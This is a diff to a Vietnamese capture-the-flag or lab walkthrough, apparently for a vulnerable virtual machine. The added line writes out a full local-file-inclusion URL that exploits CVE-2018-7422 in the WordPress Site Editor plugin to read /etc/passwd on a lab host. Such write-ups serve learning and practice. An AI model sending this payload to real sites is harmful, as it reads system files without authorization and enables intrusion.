@@ -29,7 +29,7 @@ hmm.. file đã được tải lên thành công và chuyển tới /tmp
 
 ![image](https://github.com/nguyenngocdung18/OVA/assets/134156226/4f68d86b-0c34-486f-8d0f-1ffb87da2b11)
 
-truy cập từ đường dẫn tìm thấy khi dùng CVE-2018-7422
+truy cập từ đường dẫn tìm thấy khi dùng CVE-2018-7422 : ```http://192.168.199.140/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd```
 
 ![image](https://github.com/nguyenngocdung18/OVA/assets/134156226/a5795c81-df26-4894-80db-e865d9df399e)
 
